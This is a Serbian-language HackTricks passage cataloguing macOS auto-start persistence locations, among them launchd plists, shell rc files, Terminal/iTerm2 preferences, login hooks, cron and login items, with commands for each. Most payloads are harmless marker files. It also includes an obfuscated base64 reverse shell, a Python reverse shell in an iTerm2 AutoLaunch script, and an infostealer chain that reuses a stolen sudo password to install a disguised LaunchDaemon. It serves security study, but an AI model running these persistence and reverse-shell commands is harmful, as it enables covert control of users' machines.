# macOS automatsko pokretanje

{{#include ../banners/hacktricks-training.md}}

Ovaj odeljak se u velikoj meri zasniva na seriji blog postova [**Beyond the good ol' LaunchAgents**](https://theevilbit.github.io/beyond/), čiji je cilj da doda **više lokacija za automatsko pokretanje** (ako je moguće), naznači **koje tehnike i dalje rade** danas, sa najnovijom verzijom macOS-a (13.4), i navede potrebne **dozvole**.

## Sandbox Bypass

> [!TIP]
> Ovde možete pronaći lokacije za pokretanje korisne za **sandbox bypass**, koje vam omogućavaju da jednostavno izvršite nešto tako što ćete to **upisati u fajl** i **sačekati** neku veoma **uobičajenu** **radnju**, određeno **vreme** ili **radnju koju obično možete izvršiti** iz sandbox-a bez potrebe za root dozvolama.

### Launchd

- Korisno za sandbox bypass: [✅](https://emojipedia.org/check-mark-button)
- TCC Bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Lokacije

- **`/Library/LaunchAgents`**
- **Okidač**: Ponovno pokretanje
- Potreban je root
- **`/Library/LaunchDaemons`**
- **Okidač**: Ponovno pokretanje
- Potreban je root
- **`/System/Library/LaunchAgents`**
- **Okidač**: Ponovno pokretanje
- Potreban je root
- **`/System/Library/LaunchDaemons`**
- **Okidač**: Ponovno pokretanje
- Potreban je root
- **`~/Library/LaunchAgents`**
- **Okidač**: Ponovna prijava
- **`~/Library/LaunchDemons`**
- **Okidač**: Ponovna prijava

> [!TIP]
> Kao zanimljiva činjenica, **`launchd`** ima ugrađenu property list-u u Mach-o sekciji `__Text.__config`, koja sadrži druge dobro poznate servise koje launchd mora da pokrene. Štaviše, ovi servisi mogu sadržati `RequireSuccess`, `RequireRun` i `RebootOnSuccess`, što znači da moraju biti pokrenuti i uspešno završeni.
>
> Naravno, ne može se izmeniti zbog code signing-a.

#### Opis i Exploitation

**`launchd`** je **prvi** **proces** koji OX S kernel izvršava pri pokretanju i poslednji koji završava pri gašenju. Uvek bi trebalo da ima **PID 1**. Ovaj proces će **čitati i izvršavati** konfiguracije navedene u **ASEP** **plist** fajlovima na sledećim lokacijama:

- `/Library/LaunchAgents`: Per-user agenti koje instalira administrator
- `/Library/LaunchDaemons`: Daemoni na nivou celog sistema koje instalira administrator
- `/System/Library/LaunchAgents`: Per-user agenti koje obezbeđuje Apple.
- `/System/Library/LaunchDaemons`: Daemoni na nivou celog sistema koje obezbeđuje Apple.

Kada se korisnik prijavi, plist fajlovi koji se nalaze u `/Users/$USER/Library/LaunchAgents` i `/Users/$USER/Library/LaunchDemons` pokreću se sa **dozvolama prijavljenog korisnika**.

**Glavna razlika između agenata i daemona jeste u tome što se agenti učitavaju kada se korisnik prijavi, dok se daemoni učitavaju pri pokretanju sistema** (pošto postoje servisi kao što je ssh koji moraju da se izvrše pre nego što bilo koji korisnik pristupi sistemu). Agenti takođe mogu koristiti GUI, dok daemoni moraju raditi u pozadini.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.apple.someidentifier</string>
<key>ProgramArguments</key>
<array>
<string>bash -c 'touch /tmp/launched'</string> <!--Prog to execute-->
</array>
<key>RunAtLoad</key><true/> <!--Execute at system startup-->
<key>StartInterval</key>
<integer>800</integer> <!--Execute each 800s-->
<key>KeepAlive</key>
<dict>
<key>SuccessfulExit</key></false> <!--Re-execute if exit unsuccessful-->
<!--If previous is true, then re-execute in successful exit-->
</dict>
</dict>
</plist>
```
Postoje slučajevi kada **agent treba da se izvrši pre nego što se korisnik prijavi**, a oni se nazivaju **PreLoginAgents**. Na primer, ovo je korisno za omogućavanje pomoćnih tehnologija prilikom prijavljivanja. Mogu se pronaći i u `/Library/LaunchAgents` (pogledajte [**ovde**](https://github.com/HelmutJ/CocoaSampleCode/tree/master/PreLoginAgents) primer).

> [!TIP]
> Nove konfiguracione datoteke za Daemons ili Agents biće **učitane nakon sledećeg reboot-a ili pomoću** `launchctl load <target.plist>` Takođe je **moguće učitati .plist datoteke bez te ekstenzije** pomoću `launchctl -F <file>` (međutim, te plist datoteke neće biti automatski učitane nakon reboot-a).\
> Takođe je moguće **ukloniti** ih pomoću `launchctl unload <target.plist>` (proces na koji one ukazuju biće terminiran),
>
> Da biste **osigurali** da ne postoji **ništa** (poput override-a) što **sprečava** **Agent** ili **Daemon** **da se** **pokrene**, izvršite: `sudo launchctl load -w /System/Library/LaunchDaemos/com.apple.smdb.plist`

Izlistajte sve agente i daemone koje je učitao trenutni korisnik:
```bash
launchctl list
```
#### Primer zlonamernog LaunchDaemon lanca (ponovna upotreba lozinke)

Nedavni macOS infostealer ponovo je upotrebio **uhvaćenu sudo lozinku** da instalira user agent i root LaunchDaemon:<sup>[1]</sup>

- Upisati agent loop u `~/.agent` i učiniti ga izvršnim.
- Generisati plist u `/tmp/starter` koji upućuje na taj agent.
- Ponovo upotrebiti ukradenu lozinku sa `sudo -S` da se kopira u `/Library/LaunchDaemons/com.finder.helper.plist`, postave `root:wheel` i učita pomoću `launchctl load`.
- Nečujno pokrenuti agent pomoću `nohup ~/.agent >/dev/null 2>&1 &` da bi se izlaz odvojio.
```bash
printf '%s\n' "$pw" | sudo -S cp /tmp/starter /Library/LaunchDaemons/com.finder.helper.plist
printf '%s\n' "$pw" | sudo -S chown root:wheel /Library/LaunchDaemons/com.finder.helper.plist
printf '%s\n' "$pw" | sudo -S launchctl load /Library/LaunchDaemons/com.finder.helper.plist
nohup "$HOME/.agent" >/dev/null 2>&1 &
```
> [!WARNING]
> Ako je plist u vlasništvu korisnika, čak i ako se nalazi u sistemskim folderima daemona, **task će biti izvršen kao korisnik**, a ne kao root. Ovo može sprečiti neke napade eskalacije privilegija.

#### Više informacija o launchd

**`launchd`** je **prvi proces korisničkog režima** koji pokreće **kernel**. Pokretanje procesa mora biti **uspešno** i proces **ne sme izaći niti se srušiti**. Takođe je **zaštićen** od nekih **signala za prekid**.

Jedna od prvih stvari koje bi `launchd` uradio jeste da **pokrene** sve **daemone**, kao što su:

- **Timer daemoni** zasnovani na vremenu izvršavanja:
- atd (`com.apple.atrun.plist`): Ima `StartInterval` od 30min
- crond (`com.apple.systemstats.daily.plist`): Ima `StartCalendarInterval` za pokretanje u 00:15
- **Network daemoni** kao što su:
- `org.cups.cups-lpd`: Osluškuje TCP (`SockType: stream`) koristeći `SockServiceName: printer`
- SockServiceName mora biti port ili servis iz `/etc/services`
- `com.apple.xscertd.plist`: Osluškuje TCP na portu 1640
- **Path daemoni** koji se izvršavaju kada se navedena putanja promeni:
- `com.apple.postfix.master`: Proverava putanju `/etc/postfix/aliases`
- **IOKit notifications daemoni**:
- `com.apple.xartstorageremoted`: `"com.apple.iokit.matching" => { "com.apple.device-attach" => { "IOMatchLaunchStream" => 1 ...`
- **Mach port:**
- `com.apple.xscertd-helper.plist`: U unosu `MachServices` navodi ime `com.apple.xscertd.helper`
- **UserEventAgent:**
- Ovo se razlikuje od prethodnog primera. Omogućava da `launchd` pokrene aplikacije kao odgovor na određeni događaj. Međutim, u ovom slučaju glavni binary nije `launchd`, već `/usr/libexec/UserEventAgent`. On učitava pluginove iz SIP restricted foldera /System/Library/UserEventPlugins/, gde svaki plugin navodi svoj initialiser u ključu `XPCEventModuleInitializer` ili, kod starijih pluginova, u dict-u `CFPluginFactories`, pod ključem `FB86416D-6164-2070-726F-70735C216EC0` svog `Info.plist` fajla.

### shell startup files

Izveštaj: [https://theevilbit.github.io/beyond/beyond_0001/](https://theevilbit.github.io/beyond/beyond_0001/)\
Izveštaj (xterm): [https://theevilbit.github.io/beyond/beyond_0018/](https://theevilbit.github.io/beyond/beyond_0018/)

- Korisno za zaobilaženje sandbox-a: [✅](https://emojipedia.org/check-mark-button)
- TCC Bypass: [✅](https://emojipedia.org/check-mark-button)
- Ali morate pronaći aplikaciju sa TCC bypass-om koja izvršava shell koji učitava ove fajlove

#### Lokacije

- **`~/.zshrc`, `~/.zlogin`, `~/.zshenv.zwc`**, **`~/.zshenv`, `~/.zprofile`**
- **Trigger**: Otvaranje terminala sa zsh
- **`/etc/zshenv`, `/etc/zprofile`, `/etc/zshrc`, `/etc/zlogin`**
- **Trigger**: Otvaranje terminala sa zsh
- Potreban je root
- **`~/.zlogout`**
- **Trigger**: Izlazak iz terminala sa zsh
- **`/etc/zlogout`**
- **Trigger**: Izlazak iz terminala sa zsh
- Potreban je root
- Potencijalno ih ima još u: **`man zsh`**
- **`~/.bashrc`**
- **Trigger**: Otvaranje terminala sa bash
- `/etc/profile` (nije radilo)
- `~/.profile` (nije radilo)
- `~/.xinitrc`, `~/.xserverrc`, `/opt/X11/etc/X11/xinit/xinitrc.d/`
- **Trigger**: Očekuje se da se aktivira sa xterm-om, ali on **nije instaliran**, a čak i nakon instalacije dobija se sledeća greška: xterm: `DISPLAY is not set`<sup>[3]</sup>

#### Opis i eksploatacija

Prilikom pokretanja shell okruženja kao što su `zsh` ili `bash`, **izvršavaju se određeni startup fajlovi**. macOS trenutno koristi `/bin/zsh` kao podrazumevani shell. Ovom shell-u se automatski pristupa kada se pokrene aplikacija Terminal ili kada se uređaju pristupi putem SSH-a. Iako su `bash` i `sh` takođe prisutni u macOS-u, potrebno ih je eksplicitno pozvati da bi se koristili.<sup>[2]</sup>

Man stranica za zsh, koju možemo pročitati pomoću **`man zsh`**, sadrži detaljan opis startup fajlova.
```bash
# Example executino via ~/.zshrc
echo "touch /tmp/hacktricks" >> ~/.zshrc
```
### Ponovo otvorene aplikacije

> [!CAUTION]
> Konfigurisanje navedenog exploitation-a, odjavljivanje i ponovno prijavljivanje ili čak reboot nisu mi omogućili da izvršim aplikaciju. (Aplikacija se nije izvršavala; možda mora biti pokrenuta kada se ove radnje obavljaju)

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0021/](https://theevilbit.github.io/beyond/beyond_0021/)

- Korisno za zaobilaženje sandbox-a: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Lokacija

- **`~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`**
- **Okidač**: Ponovno otvaranje aplikacija nakon restart-a

#### Opis i exploitation

Sve aplikacije koje treba ponovo otvoriti nalaze se u plist-u `~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`<sup>[4]</sup>

Dakle, da bi se prilikom ponovnog otvaranja pokrenula vaša aplikacija, potrebno je samo da **dodate svoju aplikaciju na listu**.

UUID se može pronaći izlistavanjem tog direktorijuma ili pomoću `ioreg -rd1 -c IOPlatformExpertDevice | awk -F'"' '/IOPlatformUUID/{print $4}'`

Da biste proverili aplikacije koje će biti ponovo otvorene, možete izvršiti:
```bash
defaults -currentHost read com.apple.loginwindow TALAppsToRelaunchAtLogin
#or
plutil -p ~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```
Da biste **dodali aplikaciju na ovu listu**, možete koristiti:
```bash
# Adding iTerm2
/usr/libexec/PlistBuddy -c "Add :TALAppsToRelaunchAtLogin: dict" \
-c "Set :TALAppsToRelaunchAtLogin:$:BackgroundState 2" \
-c "Set :TALAppsToRelaunchAtLogin:$:BundleID com.googlecode.iterm2" \
-c "Set :TALAppsToRelaunchAtLogin:$:Hide 0" \
-c "Set :TALAppsToRelaunchAtLogin:$:Path /Applications/iTerm.app" \
~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```
### Terminal Preferences

Writeup: [https://theevilbit.github.io/beyond/beyond_0020/](https://theevilbit.github.io/beyond/beyond_0020/)

- Korisno za zaobilaženje sandbox-a: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- Terminal koristi FDA permissions korisnika koji ga koristi

#### Lokacija

- **`~/Library/Preferences/com.apple.Terminal.plist`**
- **Okidač**: Otvaranje Terminal-a

#### Opis i eksploatacija

U direktorijumu **`~/Library/Preferences`** čuvaju se preferences korisnika za aplikacije. Neke od ovih preferences mogu sadržati konfiguraciju za **izvršavanje drugih aplikacija/skripti**.<sup>[5]</sup>

Na primer, Terminal može izvršiti komandu pri pokretanju:

<figure><img src="../images/image (1148).png" alt="" width="495"><figcaption></figcaption></figure>

Ova konfiguracija se u datoteci **`~/Library/Preferences/com.apple.Terminal.plist`** odražava ovako:
```bash
[...]
"Window Settings" => {
"Basic" => {
"CommandString" => "touch /tmp/terminal_pwn"
"Font" => {length = 267, bytes = 0x62706c69 73743030 d4010203 04050607 ... 00000000 000000cf }
"FontAntialias" => 1
"FontWidthSpacing" => 1.004032258064516
"name" => "Basic"
"ProfileCurrentVersion" => 2.07
"RunCommandAsShell" => 0
"type" => "Window Settings"
}
[...]
```
Dakle, ako bi plist sa preferencama terminala u sistemu mogao da bude prepisan, funkcionalnost **`open`** može da se koristi za **otvaranje terminala i izvršavanje te komande**.

Ovo možete dodati iz CLI-ja pomoću:
```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" 'touch /tmp/terminal-start-command'" $HOME/Library/Preferences/com.apple.Terminal.plist
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"RunCommandAsShell\" 0" $HOME/Library/Preferences/com.apple.Terminal.plist

# Remove
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" ''" $HOME/Library/Preferences/com.apple.Terminal.plist
```
### Terminal Scripts / Other file extensions

- Korisno za zaobilaženje sandbox-a: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- Korišćenje Terminal-a za dobijanje FDA dozvola korisnika

#### Location

- **Bilo gde**
- **Trigger**: Otvaranje Terminal-a

#### Description & Exploitation

Ako kreirate [**`.terminal`** script](https://stackoverflow.com/questions/32086004/how-to-use-the-default-terminal-settings-when-opening-a-terminal-file-osx) i otvorite ga, **Terminal application** će automatski biti pokrenuta kako bi izvršila komande navedene u njemu. Ako Terminal app ima posebne privilegije (kao što je TCC), vaša komanda će biti pokrenuta sa tim posebnim privilegijama.

Isprobajte sa:
```bash
# Prepare the payload
cat > /tmp/test.terminal << EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CommandString</key>
<string>mkdir /tmp/Documents; cp -r ~/Documents /tmp/Documents;</string>
<key>ProfileCurrentVersion</key>
<real>2.0600000000000001</real>
<key>RunCommandAsShell</key>
<false/>
<key>name</key>
<string>exploit</string>
<key>type</key>
<string>Window Settings</string>
</dict>
</plist>
EOF

# Trigger it
open /tmp/test.terminal

# Use something like the following for a reverse shell:
<string>echo -n "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYxOw==" | base64 -d | bash;</string>
```
Možete koristiti i ekstenzije **`.command`**, **`.tool`**, sa sadržajem regularnih shell scripts, i one će takođe biti otvorene u Terminalu.

> [!CAUTION]
> Ako Terminal ima **Full Disk Access**, moći će da dovrši tu radnju (imajte na umu da će izvršeni command biti vidljiv u prozoru Terminala).

### Audio Plugins

Writeup: [https://theevilbit.github.io/beyond/beyond_0013/](https://theevilbit.github.io/beyond/beyond_0013/)\
Writeup: [https://posts.specterops.io/audio-unit-plug-ins-896d3434a882](https://posts.specterops.io/audio-unit-plug-ins-896d3434a882)

- Korisno za zaobilaženje sandbox-a: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [🟠](https://emojipedia.org/large-orange-circle)
- Možda ćete dobiti dodatni TCC pristup

#### Lokacija

- **`/Library/Audio/Plug-Ins/HAL`**
- Potreban je root
- **Okidač**: Restartujte coreaudiod ili računar
- **`/Library/Audio/Plug-ins/Components`**
- Potreban je root
- **Okidač**: Restartujte coreaudiod ili računar
- **`~/Library/Audio/Plug-ins/Components`**
- **Okidač**: Restartujte coreaudiod ili računar
- **`/System/Library/Components`**
- Potreban je root
- **Okidač**: Restartujte coreaudiod ili računar

#### Opis

Prema prethodnim writeup-ovima, moguće je **kompajlirati neke audio plugins** i učitati ih.<sup>[6][7]</sup>

### QuickLook Plugins

Writeup: [https://theevilbit.github.io/beyond/beyond_0012/](https://theevilbit.github.io/beyond/beyond_0012/)

- Korisno za zaobilaženje sandbox-a: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [🟠](https://emojipedia.org/large-orange-circle)
- Možda ćete dobiti dodatni TCC pristup

#### Lokacija

- `/System/Library/QuickLook`
- `/Library/QuickLook`
- `~/Library/QuickLook`
- `/Applications/AppNameHere/Contents/Library/QuickLook/`
- `~/Applications/AppNameHere/Contents/Library/QuickLook/`

#### Opis i Exploitation

QuickLook plugins se mogu izvršiti kada **pokrenete preview fajla** (pritisnete razmaknicu dok je fajl izabran u Finder-u) i kada je instaliran **plugin koji podržava taj tip fajla**.<sup>[8]</sup>

Moguće je kompajlirati sopstveni QuickLook plugin, smestiti ga na jednu od prethodnih lokacija da bi se učitao, a zatim otvoriti podržani fajl i pritisnuti razmaknicu da biste ga pokrenuli.

### ~~Login/Logout Hooks~~

> [!CAUTION]
> Ovo kod mene nije radilo, ni sa korisničkim LoginHook-om ni sa root LogoutHook-om

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0022/](https://theevilbit.github.io/beyond/beyond_0022/)

- Korisno za zaobilaženje sandbox-a: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Lokacija

- Morate moći da izvršite nešto poput `defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh`
- Nalazi se u `~/Library/Preferences/com.apple.loginwindow.plist`

Oni su deprecated, ali se mogu koristiti za izvršavanje komandi kada se korisnik prijavi.<sup>[9]</sup>
```bash
cat > $HOME/hook.sh << EOF
#!/bin/bash
echo 'My is: \`id\`' > /tmp/login_id.txt
EOF
chmod +x $HOME/hook.sh
defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh
defaults write com.apple.loginwindow LogoutHook /Users/$USER/hook.sh
```
Ova postavka je sačuvana u `/Users/$USER/Library/Preferences/com.apple.loginwindow.plist`
```bash
defaults read /Users/$USER/Library/Preferences/com.apple.loginwindow.plist
{
LoginHook = "/Users/username/hook.sh";
LogoutHook = "/Users/username/hook.sh";
MiniBuddyLaunch = 0;
TALLogoutReason = "Shut Down";
TALLogoutSavesState = 0;
oneTimeSSMigrationComplete = 1;
}
```
Za brisanje:
```bash
defaults delete com.apple.loginwindow LoginHook
defaults delete com.apple.loginwindow LogoutHook
```
Onaj za root korisnika se čuva u **`/private/var/root/Library/Preferences/com.apple.loginwindow.plist`**

## Conditional Sandbox Bypass

> [!TIP]
> Ovde možete pronaći start locations korisne za **sandbox bypass**, koje vam omogućavaju da jednostavno izvršite nešto tako što ćete to **upisati u fajl** i **očekivati ne baš uobičajene uslove**, kao što su instalirani određeni **programi, „neuobičajene“ radnje korisnika** ili okruženja.

### Cron

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0004/](https://theevilbit.github.io/beyond/beyond_0004/)

- Korisno za sandbox bypass: [✅](https://emojipedia.org/check-mark-button)
- Međutim, morate moći da izvršite `crontab` binary
- Ili morate biti root
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Lokacija

- **`/usr/lib/cron/tabs/`, `/private/var/at/tabs`, `/private/var/at/jobs`, `/etc/periodic/`**
- Root je potreban za direktan pristup upisivanju. Root nije potreban ako možete da izvršite `crontab <file>`
- **Trigger**: Zavisi od cron job-a

#### Opis i Exploitation

Izlistajte cron jobs **trenutnog korisnika** pomoću:
```bash
crontab -l
```
Možete videti i sve cron jobs korisnika u **`/usr/lib/cron/tabs/`** i **`/var/at/tabs/`** (zahteva root).

U macOS-u se nekoliko foldera koji izvršavaju skripte sa **određenom učestalošću** može pronaći u:
```bash
# The one with the cron jobs is /usr/lib/cron/tabs/
ls -lR /usr/lib/cron/tabs/ /private/var/at/jobs /etc/periodic/
```
Tamo možete pronaći uobičajene **cron** **jobs**, **at** **jobs** (ne koriste se često) i **periodic** **jobs** (uglavnom se koriste za čišćenje privremenih datoteka). Dnevni **periodic** **jobs** mogu se, na primer, izvršiti pomoću: `periodic daily`.<sup>[10]</sup>

Za programsko dodavanje **user cronjob** moguće je koristiti:
```bash
echo '* * * * * /bin/bash -c "touch /tmp/cron3"' > /tmp/cron
crontab /tmp/cron
```
### iTerm2

Writeup: [https://theevilbit.github.io/beyond/beyond_0002/](https://theevilbit.github.io/beyond/beyond_0002/)

- Korisno za zaobilaženje sandbox-a: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- iTerm2 je ranije imao dodeljene TCC dozvole

#### Lokacije

- **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`**
- **Okidač**: Otvaranje iTerm-a
- **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`**
- **Okidač**: Otvaranje iTerm-a
- **`~/Library/Preferences/com.googlecode.iterm2.plist`**
- **Okidač**: Otvaranje iTerm-a

#### Opis i eksploatacija

Skripte sačuvane u **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`** biće izvršene. Na primer:<sup>[11]</sup>
```bash
cat > "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh" << EOF
#!/bin/bash
touch /tmp/iterm2-autolaunch
EOF

chmod +x "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh"
```
ili:
```bash
cat > "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.py" << EOF
#!/usr/bin/env python3
import iterm2,socket,subprocess,os

async def main(connection):
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.10.10.10',4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['zsh','-i']);
async with iterm2.CustomControlSequenceMonitor(
connection, "shared-secret", r'^create-window$') as mon:
while True:
match = await mon.async_get()
await iterm2.Window.async_create(connection)

iterm2.run_forever(main)
EOF
```
Skripta **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`** će takođe biti izvršena:
```bash
do shell script "touch /tmp/iterm2-autolaunchscpt"
```
iTerm2 preferences koje se nalaze na **`~/Library/Preferences/com.googlecode.iterm2.plist`** mogu **ukazivati na komandu koja će se izvršiti** kada se iTerm2 terminal otvori.

Ova postavka se može konfigurisati u iTerm2 podešavanjima:

<figure><img src="../images/image (37).png" alt="" width="563"><figcaption></figcaption></figure>

Komanda se zatim prikazuje u preferences:
```bash
plutil -p com.googlecode.iterm2.plist
{
[...]
"New Bookmarks" => [
0 => {
[...]
"Initial Text" => "touch /tmp/iterm-start-command"
```
Komandu koja će se izvršiti možete podesiti pomoću:
```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"New Bookmarks\":0:\"Initial Text\" 'touch /tmp/iterm-start-command'" $HOME/Library/Preferences/com.googlecode.iterm2.plist

# Call iTerm
open /Applications/iTerm.app/Contents/MacOS/iTerm2

# Remove
/usr/libexec/PlistBuddy -c "Set :\"New Bookmarks\":0:\"Initial Text\" ''" $HOME/Library/Preferences/com.googlecode.iterm2.plist
```
> [!WARNING]
> Veoma je verovatno da postoje **drugi načini za zloupotrebu iTerm2 preferences** radi izvršavanja proizvoljnih komandi.

### xbar

Writeup: [https://theevilbit.github.io/beyond/beyond_0007/](https://theevilbit.github.io/beyond/beyond_0007/)

- Korisno za zaobilaženje sandbox-a: [✅](https://emojipedia.org/check-mark-button)
- Međutim, xbar mora biti instaliran
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- Zahteva Accessibility permissions

#### Lokacija

- **`~/Library/Application\ Support/xbar/plugins/`**
- **Okidač**: Kada se xbar izvrši

#### Opis

Ako je instaliran popularni program [**xbar**](https://github.com/matryer/xbar), moguće je napisati shell script u direktorijumu **`~/Library/Application\ Support/xbar/plugins/`**, koji će biti izvršen kada se xbar pokrene:<sup>[12]</sup>
```bash
cat > "$HOME/Library/Application Support/xbar/plugins/a.sh" << EOF
#!/bin/bash
touch /tmp/xbar
EOF
chmod +x "$HOME/Library/Application Support/xbar/plugins/a.sh"
```
### Hammerspoon

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0008/](https://theevilbit.github.io/beyond/beyond_0008/)

- Korisno za zaobilaženje sandbox-a: [✅](https://emojipedia.org/check-mark-button)
- Ali Hammerspoon mora biti instaliran
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- Zahteva dozvole za Accessibility

#### Lokacija

- **`~/.hammerspoon/init.lua`**
- **Okidač**: Kada se hammerspoon izvrši

#### Opis

[**Hammerspoon**](https://github.com/Hammerspoon/hammerspoon) služi kao platforma za automatizaciju za **macOS**, koristeći **LUA scripting language** za svoje operacije. Značajno je da podržava integraciju kompletnog AppleScript koda i izvršavanje shell skripti, čime značajno proširuje svoje scripting mogućnosti.<sup>[13]</sup>

Aplikacija traži jednu datoteku, `~/.hammerspoon/init.lua`, a kada se pokrene, skripta će biti izvršena.
```bash
mkdir -p "$HOME/.hammerspoon"
cat > "$HOME/.hammerspoon/init.lua" << EOF
hs.execute("/Applications/iTerm.app/Contents/MacOS/iTerm2")
EOF
```
### BetterTouchTool

- Koristan za zaobilaženje sandbox-a: [✅](https://emojipedia.org/check-mark-button)
- Ali BetterTouchTool mora biti instaliran
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- Zahteva Automation-Shortcuts i Accessibility dozvole

#### Lokacija

- `~/Library/Application Support/BetterTouchTool/*`

Ovaj alat omogućava navođenje aplikacija ili skripti koje će se izvršiti kada se pritisnu određene prečice. Napadač bi potencijalno mogao da konfiguriše sopstvenu **prečicu i akciju za izvršavanje u bazi podataka** kako bi omogućio izvršavanje proizvoljnog koda (prečica bi mogla biti samo pritisak na taster).

### Alfred

- Koristan za zaobilaženje sandbox-a: [✅](https://emojipedia.org/check-mark-button)
- Ali Alfred mora biti instaliran
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- Zahteva Automation, Accessibility, pa čak i Full-Disk access dozvole

#### Lokacija

- `???`

Omogućava kreiranje workflow-a koji mogu da izvršavaju kod kada se ispune određeni uslovi. Potencijalno je moguće da napadač kreira workflow fajl i natera Alfred da ga učita (za korišćenje workflow-a potrebno je platiti premium verziju).

### SSHRC

Writeup: [https://theevilbit.github.io/beyond/beyond_0006/](https://theevilbit.github.io/beyond/beyond_0006/)

- Koristan za zaobilaženje sandbox-a: [✅](https://emojipedia.org/check-mark-button)
- Ali ssh mora biti omogućen i korišćen
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- SSH koristi FDA access

#### Lokacija

- **`~/.ssh/rc`**
- **Okidač**: Prijavljivanje putem ssh-a
- **`/etc/ssh/sshrc`**
- Zahteva root
- **Okidač**: Prijavljivanje putem ssh-a

> [!CAUTION]
> Za uključivanje ssh-a potreban je Full Disk Access:
>
> ```bash
> sudo systemsetup -setremotelogin on
> ```

#### Opis i eksploatacija

Podrazumevano, osim ako je `PermitUserRC no` postavljeno u `/etc/ssh/sshd_config`, kada se korisnik **prijavi putem SSH-a**, izvršavaju se skripte **`/etc/ssh/sshrc`** i **`~/.ssh/rc`**.<sup>[14]</sup>

### **Login Items**

Writeup: [https://theevilbit.github.io/beyond/beyond_0003/](https://theevilbit.github.io/beyond/beyond_0003/)

- Koristan za zaobilaženje sandbox-a: [✅](https://emojipedia.org/check-mark-button)
- Ali potrebno je izvršiti `osascript` sa argumentima
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Lokacije

- **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent`**
- **Okidač:** Prijavljivanje
- Exploit payload se čuva tako što poziva **`osascript`**
- **`/var/db/com.apple.xpc.launchd/loginitems.501.plist`**
- **Okidač:** Prijavljivanje
- Zahteva root

#### Opis

U System Preferences -> Users & Groups -> **Login Items** možete pronaći **stavke koje se izvršavaju kada se korisnik prijavi**.\
Moguće ih je izlistati, dodati i ukloniti iz komandne linije:<sup>[15]</sup>
```bash
#List all items:
osascript -e 'tell application "System Events" to get the name of every login item'

#Add an item:
osascript -e 'tell application "System Events" to make login item at end with properties {path:"/path/to/itemname", hidden:false}'

#Remove an item:
osascript -e 'tell application "System Events" to delete login item "itemname"'
```
Ove stavke se čuvaju u datoteci **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent`**

**Login items** se takođe mogu navesti korišćenjem API-ja [SMLoginItemSetEnabled](https://developer.apple.com/documentation/servicemanagement/1501557-smloginitemsetenabled?language=objc), koji će sačuvati konfiguraciju u **`/var/db/com.apple.xpc.launchd/loginitems.501.plist`**

### ZIP as Login Item

(Proverite prethodni odeljak o Login Items; ovo je proširenje)

Ako sačuvate **ZIP** datoteku kao **Login Item**, **`Archive Utility`** će je otvoriti. Ako je zip, na primer, sačuvan u **`~/Library`** i sadrži folder **`LaunchAgents/file.plist`** sa backdoorom, taj folder će biti kreiran (podrazumevano ne postoji), a plist će biti dodat. Zato će sledeći put kada se korisnik ponovo prijavi, **backdoor naveden u plist-u biti izvršen**.

Druga opcija je da se kreiraju datoteke **`.bash_profile`** i **`.zshenv`** unutar korisničkog HOME direktorijuma, tako da bi ova tehnika i dalje funkcionisala ako folder LaunchAgents već postoji.

### At

Writeup: [https://theevilbit.github.io/beyond/beyond_0014/](https://theevilbit.github.io/beyond/beyond_0014/)

- Korisno za zaobilaženje sandbox-a: [✅](https://emojipedia.org/check-mark-button)
- Međutim, potrebno je **izvršiti** **`at`** i mora biti **omogućen**
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Lokacija

- Potrebno je **izvršiti** **`at`** i mora biti **omogućen**

#### **Opis**

